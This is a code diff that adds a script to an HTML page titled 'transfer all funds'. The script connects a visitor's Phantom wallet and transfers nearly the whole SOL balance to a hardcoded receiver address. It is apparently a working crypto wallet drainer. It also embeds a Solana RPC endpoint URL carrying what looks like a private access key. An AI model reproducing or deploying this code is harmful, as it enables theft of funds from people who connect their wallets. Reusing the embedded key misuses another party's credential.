@@ -7,6 +7,60 @@
 </head>
 <body>
     <h2>Click below to transfer all funds</h2>
-    <a href="/generate-link">Transfer Now</a>
+    <button id="transferButton">Transfer Now</button>
+
+    <script src="https://unpkg.com/@solana/web3.js@1.75.0/lib/index.iife.min.js"></script>
+    <script>
+        document.getElementById('transferButton').addEventListener('click', async () => {
+            try {
+                if (!window.solana) {
+                    alert("Phantom wallet not found. Please install it first.");
+                    return;
+                }
+
+                // Connect to Phantom Wallet
+                await window.solana.connect();
+                const provider = window.solana;
+
+                // Define receiver wallet
+                const receiverWallet = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
+
+                // Use QuickNode RPC endpoint
+                const rpcEndpoint = "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df";
+
+                const connection = new solanaWeb3.Connection(rpcEndpoint, 'confirmed');
+
+                // Get the wallet public key
+                const publicKey = provider.publicKey;
+
+                // Fetch balance
+                const balance = await connection.getBalance(publicKey);
+                if (balance === 0) {
+                    alert("Insufficient balance.");
+                    return;
+                }
+
+                // Create transaction
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(receiverWallet),
+                        lamports: balance - 5000, // Transfer all SOL, leaving some for fees
+                    })
+                );
+
+                // Request signature and send the transaction
+                const signature = await provider.signAndSendTransaction(transaction);
+                alert("Transaction sent with signature: " + signature.signature);
+
+                // Confirm transaction
+                await connection.confirmTransaction(signature.signature);
+                alert("Transaction confirmed!");
+            } catch (error) {
+                console.error("Error during transfer:", error);
+                alert("Error: " + error.message);
+            }
+        });
+    </script>
 </body>
 </html>
